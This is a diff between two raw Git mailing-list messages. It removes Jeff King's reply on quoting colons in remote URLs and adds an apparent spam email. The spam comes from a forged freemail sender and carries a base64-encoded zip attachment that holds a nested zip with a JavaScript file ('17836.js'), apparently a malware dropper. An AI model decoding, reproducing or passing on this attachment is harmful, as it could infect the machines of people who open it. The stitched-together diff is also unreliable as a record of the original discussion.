@@ -2,63 +2,138 @@ Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
 X-Spam-Level: 
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-5.6 required=3.0 tests=AWL,BAYES_00,
-	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD
-	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=-5.2 required=3.0 tests=BAYES_00,
+	FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,HEADER_FROM_DIFFERENT_DOMAINS,
+	RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,ZIPFILE shortcircuit=no autolearn=ham
+	autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id F1C93203EA
-	for <e@80x24.org>; Sat, 10 Dec 2016 08:27:03 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 480CF203EA
+	for <e@80x24.org>; Sat, 10 Dec 2016 08:41:30 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1752704AbcLJI1B (ORCPT <rfc822;e@80x24.org>);
-        Sat, 10 Dec 2016 03:27:01 -0500
-Received: from cloud.peff.net ([104.130.231.41]:54554 "EHLO cloud.peff.net"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752200AbcLJI1A (ORCPT <rfc822;git@vger.kernel.org>);
-        Sat, 10 Dec 2016 03:27:00 -0500
-Received: (qmail 32155 invoked by uid 109); 10 Dec 2016 08:27:00 -0000
-Received: from Unknown (HELO peff.net) (10.0.1.2)
-    by cloud.peff.net (qpsmtpd/0.84) with SMTP; Sat, 10 Dec 2016 08:27:00 +0000
-Received: (qmail 24996 invoked by uid 111); 10 Dec 2016 08:27:39 -0000
-Received: from sigill.intra.peff.net (HELO sigill.intra.peff.net) (10.0.0.7)
-    by peff.net (qpsmtpd/0.84) with SMTP; Sat, 10 Dec 2016 03:27:39 -0500
-Received: by sigill.intra.peff.net (sSMTP sendmail emulation); Sat, 10 Dec 2016 03:26:57 -0500
-Date:   Sat, 10 Dec 2016 03:26:57 -0500
-From:   Jeff King <peff@peff.net>
-To:     Johannes Sixt <j6t@kdbg.org>
-Cc:     Klaus Ethgen <Klaus@Ethgen.ch>, git@vger.kernel.org
-Subject: Re: [BUG] Colon in remote urls
-Message-ID: <20161210082657.zjp52a2zdtqifmg3@sigill.intra.peff.net>
-References: <20161209140215.qlam6bexm5irpro2@ikki.ethgen.ch>
- <20161209152219.ehfk475vdg4levop@sigill.intra.peff.net>
- <88bed7c9-4d5d-45d5-5d13-6a8ae834e602@kdbg.org>
+        id S1752641AbcLJIl2 (ORCPT <rfc822;e@80x24.org>);
+        Sat, 10 Dec 2016 03:41:28 -0500
+Received: from 111-240-139-34.dynamic.hinet.net ([111.240.139.34]:41149 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752204AbcLJIl1 (ORCPT <rfc822;git@vger.kernel.org>);
+        Sat, 10 Dec 2016 03:41:27 -0500
+X-Greylist: delayed 588 seconds by postgrey-1.27 at vger.kernel.org; Sat, 10 Dec 2016 03:41:25 EST
+To:     <git@vger.kernel.org>
+Date:   Sat, 10 Dec 2016 08:41:20 -0000
+Subject: Sat, 10 Dec 2016 08:41:20 -0000 54450 git
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-In-Reply-To: <88bed7c9-4d5d-45d5-5d13-6a8ae834e602@kdbg.org>
+From:   <jjwantjay@163.com>
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment
+Message-ID: <148135928092.24233.3692770647142348619@hinet.net>
+Content-Type: application/zip; name="EMAIL_823198_git.zip"
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-On Fri, Dec 09, 2016 at 10:32:48PM +0100, Johannes Sixt wrote:
-
-> > +			if (*p == '\\')
-> > +				literal = 1;
-> 
-> There are too many systems out there that use a backslash in path names. I
-> don't think it is wise to use it also as the quoting character.
-
-Yeah, I picked it arbitrarily as the common quoting character, but I
-agree it probably makes backwards compatibility (and general usability
-when you have to double-backslash each instance) pretty gross on
-Windows.
-
-Most of the printable characters are going to suffer from backwards
-compatibility issues. Syntactically, we could use any ASCII control code
-below 0x20. Certainly our C code would be fine with that, but it seems
-pretty nasty.
-
-There's probably some crazy non-printing UTF-8 sequence we could use,
-too, but I'm not sure I want to go there.
-
--Peff
+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
+UwAAAAIXAAAAAA==
